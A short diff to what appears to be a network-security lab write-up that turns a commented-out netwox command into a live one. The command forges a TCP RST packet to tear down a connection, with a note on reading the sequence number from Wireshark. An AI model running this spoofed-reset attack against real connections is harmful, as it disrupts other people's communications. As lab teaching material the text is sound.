@@ -22,7 +22,7 @@ The attacker, mimicking the server, only needs to send one RST packet to perform
 The command should be in this format:
 
 ```bash
-# sudo netwox 40 --ip4-src source_ip --ip4-dst destination_ip --tcp-src source_port --tcp-dst destination_port --tcp-rst --tcp-seqnum sequence_number.
+sudo netwox 40 --ip4-src source_ip --ip4-dst destination_ip --tcp-src source_port --tcp-dst destination_port --tcp-rst --tcp-seqnum sequence_number.
 ```
 
 > **Note**: The attacker needs to use Wireshark to find out the parameter information for the above command: pay attention to the last packet sent from the server to the client, it will tell you what the next sequence number should be.
